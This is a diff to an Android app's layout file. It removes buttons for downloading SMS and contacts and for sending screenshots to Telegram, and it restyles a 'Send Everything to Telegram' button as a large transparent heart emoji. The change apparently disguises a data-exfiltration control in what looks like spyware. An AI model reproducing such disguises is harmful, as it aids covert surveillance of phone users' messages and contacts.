@@ -7,47 +7,15 @@
     tools:context=".MainActivity">
 
     <Button
-        android:id="@+id/btn_download_sms"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="Download SMS"
-        app:layout_constraintBottom_toTopOf="@+id/btn_download_contacts"
-        app:layout_constraintEnd_toEndOf="parent"
-        app:layout_constraintStart_toStartOf="parent"
-        app:layout_constraintTop_toTopOf="parent"
-        app:layout_constraintVertical_chainStyle="packed" />
-
-    <Button
-        android:id="@+id/btn_download_contacts"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:layout_marginTop="16dp"
-        android:text="Download Contacts"
-        app:layout_constraintBottom_toTopOf="@+id/btn_send_screenshots"
-        app:layout_constraintEnd_toEndOf="parent"
-        app:layout_constraintStart_toStartOf="parent"
-        app:layout_constraintTop_toBottomOf="@+id/btn_download_sms" />
-
-    <Button
-        android:id="@+id/btn_send_screenshots"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:layout_marginTop="16dp"
-        android:text="Send Screenshots to Telegram"
-        app:layout_constraintBottom_toTopOf="@+id/btn_send_all"
-        app:layout_constraintEnd_toEndOf="parent"
-        app:layout_constraintStart_toStartOf="parent"
-        app:layout_constraintTop_toBottomOf="@+id/btn_download_contacts" />
-
-    <Button
         android:id="@+id/btn_send_all"
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:layout_marginTop="16dp"
-        android:text="Send Everything to Telegram"
+        android:text="💜"
+        android:textSize="120sp"
+        android:background="@android:color/transparent"
         app:layout_constraintBottom_toBottomOf="parent"
         app:layout_constraintEnd_toEndOf="parent"
         app:layout_constraintStart_toStartOf="parent"
-        app:layout_constraintTop_toBottomOf="@+id/btn_send_screenshots" />
+        app:layout_constraintTop_toTopOf="parent" />
 
 </androidx.constraintlayout.widget.ConstraintLayout>
